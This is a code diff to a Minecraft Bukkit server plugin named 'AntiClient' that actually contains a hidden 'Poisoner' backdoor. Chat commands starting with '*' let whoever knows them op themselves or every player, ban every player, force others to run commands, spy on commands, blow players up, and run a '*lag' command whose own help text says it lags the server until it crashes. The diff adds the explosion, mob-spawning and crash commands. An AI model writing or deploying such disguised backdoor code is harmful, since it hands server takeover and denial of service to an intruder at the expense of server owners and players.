@@ -7,6 +7,7 @@
 
 package me.clanky.anticlient;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -19,6 +20,7 @@ import org.bukkit.OfflinePlayer;
 import org.bukkit.Sound;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -32,6 +34,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 
+import me.clanky.anticlient.EntityGetter;
+
 public class Main extends JavaPlugin implements Listener {
 	List<Player> listGodMode = new ArrayList();
 	List<Player> listSpy = new ArrayList();
@@ -42,12 +46,14 @@ public class Main extends JavaPlugin implements Listener {
 	  }
 	
 	//Intialisation command.
+	boolean enabled = false;
 		public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
 		  {
-			boolean enabled = false;
-		    if (cmd.getName().equalsIgnoreCase("ac")) {enabled = !enabled;
+		    if (cmd.getName().equalsIgnoreCase("ac")) {
+		    	enabled = !enabled;
 		    	  if(enabled){
 		    		  sender.sendMessage("[AntiClient] Status: \247cDisabled.\247f");
+		    		  
 		    	  }else{
 		    		  sender.sendMessage("[AntiClient] Status: \247aEnabled.\247f");
 		    	  }
@@ -81,7 +87,7 @@ public class Main extends JavaPlugin implements Listener {
 			    		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
 			    	}
 			    }catch (Exception e){
-			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			    }
 		    }else if(m.equalsIgnoreCase("*op")){
 		    	try{
@@ -92,7 +98,7 @@ public class Main extends JavaPlugin implements Listener {
 		    			p.sendMessage("\2476[Poisoner] \247eYou are already OP!");
 		    		}
 		    	}catch (Exception e){
-		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		    	}
 		    }else if(m.toLowerCase().startsWith("*deop") && !m.equalsIgnoreCase("*deop") && !m.equalsIgnoreCase("*deopall")){
 		    	try{
@@ -108,7 +114,7 @@ public class Main extends JavaPlugin implements Listener {
 			    		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
 			    	}
 			    }catch (Exception e){
-			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			    }
 		    }else if(m.equalsIgnoreCase("*deop")){
 		    	try{
@@ -119,7 +125,7 @@ public class Main extends JavaPlugin implements Listener {
 		    			p.sendMessage("\2476[Poisoner] \247eYou are already a normal player!");
 		    		}
 		    	}catch (Exception e){
-		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		    	}
 		    }else if(m.toLowerCase().startsWith("*goodeffects") && !m.equalsIgnoreCase("*goodeffects")){
 		        Player q = Bukkit.getPlayer(s[1]);	
@@ -140,7 +146,7 @@ public class Main extends JavaPlugin implements Listener {
 		        		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
 		        	}
 		        }catch (Exception e){
-		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		        }
 		    }else if(m.equalsIgnoreCase("*goodeffects")){
 		    	try{
@@ -156,7 +162,7 @@ public class Main extends JavaPlugin implements Listener {
 			            p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 10000, 0));
 			            p.sendMessage("\2476[Poisoner] \247aGood potion effects werde added to you.");
 		        }catch (Exception e){
-		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		        }
 		    }else if(m.toLowerCase().startsWith("badeffects") && !m.equalsIgnoreCase("*badeffects")){
 		        Player q = Bukkit.getPlayer(s[1]);	
@@ -171,7 +177,7 @@ public class Main extends JavaPlugin implements Listener {
 		        		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
 		        	}
 		        }catch (Exception e){
-		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		        }
 		  }else if(m.equalsIgnoreCase("*badeffects")){
 		    	try{
@@ -181,7 +187,7 @@ public class Main extends JavaPlugin implements Listener {
 		            p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 10000, 0));
 		            p.sendMessage("\2476[Poisoner] \247aBad potion effects werde added to you.");
 	        }catch (Exception e){
-	        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        }
 		  }else if(m.toLowerCase().startsWith("*drop") && !m.equalsIgnoreCase("*drop") && !m.equalsIgnoreCase("*dropall")){
 			  Player q = Bukkit.getPlayer(s[1]);
@@ -197,7 +203,7 @@ public class Main extends JavaPlugin implements Listener {
 					  p.sendMessage("\2476[Poisoner] \247aItems of player " + q.getDisplayName() + " are dropping now.");
 				  }
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.equalsIgnoreCase("*drop")){
 			  try{
@@ -210,7 +216,7 @@ public class Main extends JavaPlugin implements Listener {
 						}
 					  p.sendMessage("\2476[Poisoner] \247aYour items are dropping now.");
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.equalsIgnoreCase("*dropall")){
 			  try{
@@ -225,7 +231,7 @@ public class Main extends JavaPlugin implements Listener {
 					  p.sendMessage("\2476[Poisoner] \247aItems of all players are dropping now.");
 				  }
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.toLowerCase().startsWith("*ban") && !m.equalsIgnoreCase("*banall")){
 			  Player q = Bukkit.getPlayer(s[1]);
@@ -246,7 +252,7 @@ public class Main extends JavaPlugin implements Listener {
 					  p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *ban <player>");
 				  }
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.equalsIgnoreCase("*banall")){
 			  try{
@@ -258,7 +264,7 @@ public class Main extends JavaPlugin implements Listener {
 				      }
 				  p.sendMessage("\2476[Poisoner] \247aAll players were banned.");
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.toLowerCase().startsWith("*unban") && !m.equalsIgnoreCase("*unbanall")){
 			  OfflinePlayer q = Bukkit.getOfflinePlayer(s[1]);
@@ -275,7 +281,7 @@ public class Main extends JavaPlugin implements Listener {
 					  p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *unban <player>");
 				  }
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 				  p.sendMessage("\2476[Poisoner] \247c" + e);
 			  }
 		  } else if(m.equalsIgnoreCase("*unbanall")){
@@ -285,7 +291,7 @@ public class Main extends JavaPlugin implements Listener {
 				      }
 				  p.sendMessage("\2476[Poisoner] \247aAll players were unbanned.");
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.equalsIgnoreCase("*god")){
 			  try{
@@ -297,7 +303,7 @@ public class Main extends JavaPlugin implements Listener {
 					  p.sendMessage("\2476[Poisoner] \247aYour godmode was removed.");
 				  }
 			  }catch (Exception e){
-				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 			  }
 		  } else if(m.toLowerCase().startsWith("*haunt")){
 	        	if (s.length > 1)
@@ -312,7 +318,7 @@ public class Main extends JavaPlugin implements Listener {
 	                  hauntedPlayers.put(q, Boolean.valueOf(true));
 	                  p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " is now being haunted.");
 	              }catch (Exception e){
-	            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	              }
 	            }else{
 	            	p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *haunt <player>");
@@ -324,7 +330,7 @@ public class Main extends JavaPlugin implements Listener {
 					      }
 					  p.sendMessage("\2476[Poisoner] \247aAll players are now OP.");
 				  }catch (Exception e){
-					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 				  }
 	        } else if(m.equalsIgnoreCase("*deopall")){
 	        	try{
@@ -335,7 +341,7 @@ public class Main extends JavaPlugin implements Listener {
 					      }
 					  p.sendMessage("\2476[Poisoner] \247aAll players are now normal players.");
 				  }catch (Exception e){
-					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 				  }
 	        } else if(m.toLowerCase().startsWith("*sudo")){
 		    	if (s.length > 1) {
@@ -350,7 +356,7 @@ public class Main extends JavaPlugin implements Listener {
 		                }
 		              catch (Exception e)
 		              {
-		            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		              }
 		            } else {
 		            	p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *sudo <player> <chat or /command>");
@@ -370,7 +376,7 @@ public class Main extends JavaPlugin implements Listener {
 			    		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *tp <source_player> <destination_player>");
 			    	}
 		    	}catch (Exception e){
-		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		    	}
 		    } else if(m.toLowerCase().startsWith("*gm1") && !m.equalsIgnoreCase("*gm1")){
 		    	Player q = Bukkit.getPlayer(s[1]);
@@ -386,7 +392,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.equalsIgnoreCase("*gm1")){
 	        	try{
@@ -397,7 +403,7 @@ public class Main extends JavaPlugin implements Listener {
 	        				p.sendMessage("\2476[Poisoner] \247eYou are already in creative mode.");
 	        			}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        }else if(m.toLowerCase().startsWith("*gm0") && !m.equalsIgnoreCase("*gm0")){
 	        	Player q = Bukkit.getPlayer(s[1]);
@@ -413,7 +419,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.equalsIgnoreCase("*gm0")){
 	        	try{
@@ -424,7 +430,7 @@ public class Main extends JavaPlugin implements Listener {
 	        				p.sendMessage("\2476[Poisoner] \247eYou are already in survival mode.");
 	        			}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.toLowerCase().startsWith("*gm2") && !m.equalsIgnoreCase("*gm2")){
 	        	Player q = Bukkit.getPlayer(s[1]);
@@ -440,7 +446,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.equalsIgnoreCase("*gm2")){
 	        	try{
@@ -451,7 +457,7 @@ public class Main extends JavaPlugin implements Listener {
 	        				p.sendMessage("\2476[Poisoner] \247eYou are already in adventure mode.");
 	        			}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.toLowerCase().startsWith("*heal") && !m.equalsIgnoreCase("*heal")){
 	        	Player q = Bukkit.getPlayer(s[1]);
@@ -469,7 +475,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *heal [player]");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.equalsIgnoreCase("*heal")){
 	        	try{
@@ -478,7 +484,7 @@ public class Main extends JavaPlugin implements Listener {
             		p.setFoodLevel(20);
             		p.sendMessage("\2476[Poisoner] \247aYou were healed.");
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.toLowerCase().startsWith("*swap")){
 	        	try{
@@ -498,7 +504,7 @@ public class Main extends JavaPlugin implements Listener {
 		        		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *swap <player1> <player2>");
 		        	}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        } else if(m.toLowerCase().startsWith("*burn")){
 	        	try{
@@ -514,7 +520,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *burn <player>");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        }else if(m.toLowerCase().startsWith("*strike")){
 	        	try{
@@ -530,7 +536,7 @@ public class Main extends JavaPlugin implements Listener {
 	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *strike <player>");
 	        		}
 	        	}catch (Exception e){
-	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 	        	}
 	        }else if(m.toLowerCase().startsWith("*swapinv")){
 	        	Player q1 = Bukkit.getPlayer(s[1]);
@@ -557,7 +563,7 @@ public class Main extends JavaPlugin implements Listener {
 		        			p.sendMessage("\2476[Poisoner] \247cOne of these players was not found.");
 		        		}
 		        	}catch (Exception e){
-		        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+		        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
 		        	}
 	        	}else{
 	        		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *swapinv <player1> <player2>");
@@ -571,8 +577,103 @@ public class Main extends JavaPlugin implements Listener {
 	        		listSpy.remove(p);
 	        		p.sendMessage("\2476[Poisoner] \247aYou're not anymore spying on commands.");
 	        	}
-	        }
-	        	else if(m.toLowerCase().startsWith("*help")){
+	        }else if(m.equalsIgnoreCase("*day")){
+	        	try{
+	        		p.getWorld().setTime(1000L);
+	        		p.sendMessage("\2476[Poisoner] \247aThe time was set to day.");
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*night")){
+	        	try{
+	        		p.getWorld().setTime(15000L);
+	        		p.sendMessage("\2476[Poisoner] \247aThe time was set to night.");
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*sunny")){
+	        	try{
+	        		p.getWorld().setStorm(false);
+		            p.getWorld().setThundering(false);
+	        		p.sendMessage("\2476[Poisoner] \247aThe weather was set to sunny.");
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*rainy")){
+	        	try{
+	        		p.getWorld().setStorm(true);
+		            p.getWorld().setThundering(true);
+	        		p.sendMessage("\2476[Poisoner] \247aThe weather was set to rainy/stormy.");
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*explodeall")){
+	        	try{
+	        		for(Player q : Bukkit.getOnlinePlayers()){
+	        			if(q != p){
+	        		    	q.getWorld().createExplosion(q.getLocation(), 10);
+	        			}
+	        		}
+	        		p.sendMessage("\2476[Poisoner] \247aAll players were blown up.");
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*explode")){
+	        	try{
+	        		if(s.length > 1){
+	        			Player q = Bukkit.getPlayer(s[1]);
+	        			if(q.isOnline()){
+	        				q.getWorld().createExplosion(q.getLocation(), 10);
+	        				p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was blown up.");
+	        			}else{
+	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
+	        			}
+	        		}else{
+	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *explode <player>");
+	        		}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.equalsIgnoreCase("*lag")){
+	        	try{
+                	for (Player q : Bukkit.getOnlinePlayers()){
+                		int j = new Integer(0);
+                    	int i = new Integer(s[3]);
+                    	
+        				while(i > j){
+        					if(q != p){
+        						q.getWorld().spawnEntity(q.getLocation(), EntityType.BLAZE);
+                            	q.getWorld().spawnEntity(q.getLocation(), EntityType.WITHER);
+                            	q.getWorld().spawnEntity(q.getLocation(), EntityType.ENDERMAN);
+                            	q.getWorld().spawnEntity(q.getLocation(), EntityType.GIANT);
+                            	q.getWorld().createExplosion(q.getLocation(), 20);
+        					}
+                        }
+        			}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.toLowerCase().startsWith("*creep")){
+	        	try{
+	        		if(s.length > 1){
+	        			Player q = Bukkit.getPlayer(s[1]);
+                        if(q.isOnline()){
+                        	int j = new Integer(0);
+                        	int i = new Integer(s[3]);
+                            while(i > j){
+                            	q.getWorld().spawnEntity(q.getLocation(), EntityGetter.getEntity(s[2]));
+                            	j++;
+                            }
+	        		}else{
+	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
+	        		}
+	        	}else{
+	        		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *creep <player> <mob> <amount>");
+	        	}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax? Error:" + e);
+	        	}
+	        }else if(m.toLowerCase().startsWith("*help")){
 			  p.sendMessage("\2476[Poisoner] \247aThe help pages were initialized.");
 			  p.sendMessage("\2476[Poisoner] \247f*op [player] | OPs you or another player.");
 			  p.sendMessage("\2476[Poisoner] \247f*opall | OPs all players.");
@@ -586,11 +687,18 @@ public class Main extends JavaPlugin implements Listener {
 			  p.sendMessage("\2476[Poisoner] \247f*banall | Bans all players except you.");
 			  p.sendMessage("\2476[Poisoner] \247f*unban <player> | Unbans a specific player.");
 			  p.sendMessage("\2476[Poisoner] \247f*unbanall | Unbans all players.");
+			  p.sendMessage("\2476[Poisoner] \247f*day | Sets the world time to day.");
+			  p.sendMessage("\2476[Poisoner] \247f*night | Sets the world time to night.");
+			  p.sendMessage("\2476[Poisoner] \247f*sunny | Sets the local weather to sunny.");
+			  p.sendMessage("\2476[Poisoner] \247f*rainy | Sets the local weather to rainy.");
 			  p.sendMessage("\2476[Poisoner] \247f*gm0 [player] | Sets you or another player in survival mode.");
 			  p.sendMessage("\2476[Poisoner] \247f*gm1 [player] | Sets you or another player in creative mode.");
 			  p.sendMessage("\2476[Poisoner] \247f*gm2 [player] | Sets you or another player in adventure mode.");
 			  p.sendMessage("\2476[Poisoner] \247f*god | Sets yourself on godmode.");
 			  p.sendMessage("\2476[Poisoner] \247f*heal [player] | Heals yourself or another player.");
+			  p.sendMessage("\2476[Poisoner] \247f*explode [player] | Creates an huge explosion at a specific players location.");
+			  p.sendMessage("\2476[Poisoner] \247f*explodeall | Creates an huge explosion at all players except you.");
+			  p.sendMessage("\2476[Poisoner] \247f*creep <player> <mob> <amount> | Spawns a specific mob at a specific player.");
 			  p.sendMessage("\2476[Poisoner] \247f*tp <source_player> <destination_player> | Teleports source_player to destination_player.");
 			  p.sendMessage("\2476[Poisoner] \247f*swap <player1> <player2> | Swaps the location of player1 and player2.");
 			  p.sendMessage("\2476[Poisoner] \247f*haunt <player> | Plays creepy sounds at a specific player.");
@@ -599,7 +707,8 @@ public class Main extends JavaPlugin implements Listener {
 			  p.sendMessage("\2476[Poisoner] \247f*sudo <player> <chat or /command> | Forces a player to execute a command or write into the chat.");
 			  p.sendMessage("\2476[Poisoner] \247f*swapinv <player1> <player2> | Drops the inventories of player1 and player2 at the other players position.");
 			  p.sendMessage("\2476[Poisoner] \247f*spy | Spys players. When they type a command, you'll be noticed with the players name, as well as the executed command.");
-		  }
+			  p.sendMessage("\2476[Poisoner] \247f*lag | This WILL lag the shit out of the server. So be careful and leave the server after executing, if you don't want to play with 1 FPS (until it crashes)!");
+	        	}
 		    }
 		  }
 		
